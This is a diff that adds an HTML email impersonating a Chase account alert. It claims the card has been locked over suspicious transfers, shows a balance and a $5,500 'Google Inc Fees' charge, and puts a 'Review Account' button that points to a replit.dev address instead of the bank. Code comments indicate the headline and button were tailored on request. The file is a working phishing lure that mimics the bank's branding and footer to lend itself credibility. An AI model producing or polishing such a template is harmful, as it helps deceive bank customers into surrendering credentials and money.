@@ -1,0 +1,221 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Chase — Account Alert</title>
+<style>
+  /* Reset + base */
+  *,*::before,*::after{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;
+    font-family: "Helvetica Neue", Arial, Helvetica, sans-serif;
+    background:#f3f4f6;
+    color:#222;
+    -webkit-font-smoothing:antialiased;
+    -moz-osx-font-smoothing:grayscale;
+    padding:2% 3%;
+    line-height:1.35;
+  }
+
+  /* container behaves responsively (100% relative) */
+  .wrapper{
+    width:100%;
+    max-width:760px;
+    margin:0 auto;
+    background:#fff;
+    border-radius:6px;
+    overflow:hidden;
+    position:relative;
+    box-shadow:0 6px 18px rgba(0,0,0,.06);
+  }
+
+  /* Blue side bars like the image */
+  .side-bar-left,
+  .side-bar-right{
+    position:absolute;
+    top:0;
+    bottom:0;
+    width:3.8%;
+    min-width:18px;
+    background:#0e66b2;
+  }
+  .side-bar-left{left:0;border-top-left-radius:6px;border-bottom-left-radius:6px}
+  .side-bar-right{right:0;border-top-right-radius:6px;border-bottom-right-radius:6px}
+
+  /* Header area */
+  .header{
+    padding:4.5% 6%;
+    padding-top:5.5%;
+    padding-bottom:3%;
+    display:flex;
+    align-items:flex-start;
+    gap:2%;
+    position:relative;
+  }
+  .logo{
+    width:18%;
+    max-width:120px;
+    height:auto;
+    object-fit:contain;
+  }
+
+  /* Small "Account alert" label above headline */
+  .label{
+    font-size:.92rem;
+    color:#666;
+    margin-top:6%;
+    margin-bottom:4%;
+    margin-left:1%;
+  }
+
+  /* Big headline similar scale to image — use relative units */
+  .headline{
+    font-size:2.1rem;
+    line-height:1.05;
+    font-weight:700;
+    color:#333;
+    margin:0 6% 1.6% 6%;
+    word-break:break-word;
+  }
+
+  /* account table area */
+  .account-panel{
+    margin:0 6% 1.5% 6%;
+    border-top:1px solid #e6e6e6;
+    padding-top:2.2%;
+  }
+  .account-row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:1.1% 0;
+    border-bottom:1px solid transparent;
+    font-size:.95rem;
+  }
+  .account-row hr{border:none;border-top:1px solid #e6e6e6;margin:6px 0}
+  .muted{color:#666;font-size:.95rem}
+  .amount{
+    font-weight:700;
+    color:#222;
+    font-size:1rem;
+  }
+
+  /* informational paragraph block */
+  .info{
+    margin:2% 6%;
+    color:#555;
+    font-size:.96rem;
+  }
+
+  /* Improved CTA - more prominent blue button */
+  .cta{
+    display:inline-block;
+    margin:1.6% 6%;
+    text-decoration:none;
+    padding:12px 24px;
+    border-radius:6px;
+    background:#0e66b2;
+    color:#fff;
+    font-weight:600;
+    font-size:.95rem;
+    text-align:center;
+    transition:background-color 0.2s;
+  }
+  .cta:hover{
+    background:#0a5490;
+  }
+
+  /* small footer area */
+  .footer{
+    margin:2.5% 6% 4% 6%;
+    color:#757575;
+    font-size:.86rem;
+    border-top:1px solid #f0f0f0;
+    padding-top:2%;
+  }
+  .footer a{color:#0e66b2;text-decoration:underline}
+
+  /* responsive tweaks */
+  @media (max-width:520px){
+    .logo{width:26%}
+    .headline{font-size:1.6rem}
+    .side-bar-left,.side-bar-right{width:4.5%}
+    .header{padding:6% 5%}
+    .account-row{font-size:.92rem}
+    .cta{display:block;margin:1.6% 6%;text-align:center}
+  }
+</style>
+</head>
+<body>
+  <div class="wrapper" role="article" aria-label="Chase account alert">
+    <!-- blue vertical bars -->
+    <div class="side-bar-left" aria-hidden="true"></div>
+    <div class="side-bar-right" aria-hidden="true"></div>
+
+    <!-- header with logo (fixed URL) -->
+    <header class="header">
+      <img class="logo" alt="Chase" src="https://logo.clearbit.com/chase.com">
+    </header>
+
+    <!-- small label like the original "Account alert" -->
+    <div class="label">Account alert</div>
+
+    <!-- large headline changed to required message -->
+    <h1 class="headline">Your card has been locked due to suspicious transfer activity</h1>
+
+    <!-- account info block styled to match proportions in the image -->
+    <section class="account-panel" aria-labelledby="account-heading">
+      <div class="account-row" style="padding-top:.3rem;">
+        <div class="muted">Account ending in</div>
+        <div class="muted">(...2596)</div>
+      </div>
+
+      <div class="account-row">
+        <div class="muted">As of</div>
+        <div class="muted">Tue, Oct 21, 2025</div>
+      </div>
+
+      <div class="account-row" style="border-bottom:1px solid #e6e6e6;padding-bottom:.8rem">
+        <div class="muted">Available balance</div>
+        <div class="amount">$14,298.23</div>
+      </div>
+    </section>
+
+    <!-- explanatory paragraphs - shortened content -->
+    <div class="info">
+      <p>Our security systems detected unusual transfer activity on your account. For your protection, your card has been temporarily locked.</p>
+
+      <p>$5,500.00 Google Inc Fees.</p>
+    </div>
+
+    <!-- Improved CTA with blue button -->
+    <div style="margin-bottom:1.2rem;">
+      <a class="cta" href="https://b7ed3516-3dd1-4f91-bd63-b4b31a5cbca7-00-3dy59wtqxb6th.kirk.replit.dev/" role="button" aria-label="Review account">Review Account</a>
+    </div>
+
+    <!-- condensed footer with links and disclaimers -->
+    <footer class="footer" role="contentinfo">
+      <p>Securely access your accounts with the <a href="https://www.chase.com/mobile">Chase Mobile® app</a> or <a href="https://www.chase.com">chase.com</a>.</p>
+
+      <div style="margin-top:1rem;">
+        <strong>ABOUT THIS MESSAGE</strong>
+        <p style="margin-top:.6rem;color:#808080">This service email was sent based on your alert settings. Manage your settings in the Chase Mobile app or at chase.com/alerts.</p>
+      </div>
+
+      <div style="margin-top:1rem;color:#666;">
+        <p style="margin-bottom:.35rem;">If you recognize all recent transactions, you can unlock your card immediately in the Chase Mobile app or at chase.com.</p>
+
+        <p style="margin-bottom:.35rem;">Chase Customer Service: <strong>1-800-935-9935</strong></p>
+        <p style="margin-bottom:.35rem;">24/7 Fraud Monitoring: <strong>1-888-297-0792</strong></p>
+      </div>
+
+      <div style="margin-top:1rem;color:#808080;font-size:.83rem;">
+        <p>This is an automated security message. Please do not reply to this email.</p>
+        <p style="margin-top:.6rem;">© 2025 JPMorgan Chase &amp; Co. All rights reserved.</p>
+      </div>
+    </footer>
+  </div>
+</body>
+</html>
